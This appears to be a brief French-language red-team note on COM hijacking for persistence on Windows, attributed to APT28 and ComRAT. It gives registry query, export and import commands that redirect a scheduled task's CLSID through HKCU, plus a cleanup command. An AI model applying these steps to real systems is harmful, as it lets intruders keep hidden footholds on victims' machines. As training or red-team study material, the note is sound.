
> [!NOTE] APT28, Mosquito, ComRAT et al.

COM (Component Object Model) is a platform-independent, distributed, object-oriented system for creating binary software components


Setup:
Trouver les informations sur les objects de registre COMs

```c
reg query "HKCR\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}"
reg query "HKCU\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}"
reg query "HKLM\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}"
```

Exploiter COM

```c
schtasks /query /xml > tasks.xml
```

A partir de la on regardons 02 choses: la section `Exec` et `Triggers`


```c
reg export "HKLM\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}" c:\rto\PERS\01.USER\tsk-orig.reg /y /reg:64

reg import c:\rto\PERS\01.USER\tsk.reg /reg:64
reg query "HKCU\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\InProcServer32" /reg:64

```


removal:

```http
reg delete "HKCU\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}" /f /reg:64
```